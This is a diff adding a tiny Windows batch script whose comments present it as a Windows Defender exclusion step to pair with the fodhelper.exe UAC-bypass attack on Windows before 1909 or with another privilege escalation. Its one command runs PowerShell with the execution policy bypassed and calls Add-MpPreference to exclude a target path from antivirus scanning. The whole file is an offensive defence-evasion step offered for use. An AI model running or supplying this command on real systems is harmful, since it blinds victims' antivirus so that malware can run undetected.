@@ -1,0 +1,7 @@
+::==================================================================================
+:: exclusion path in windows defender
+:: use with fodhelper.exe attack (works in win < 1909) or any privileges escalation
+::==================================================================================
+
+
+powershell.exe -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath "C:\TARGET_PATH"
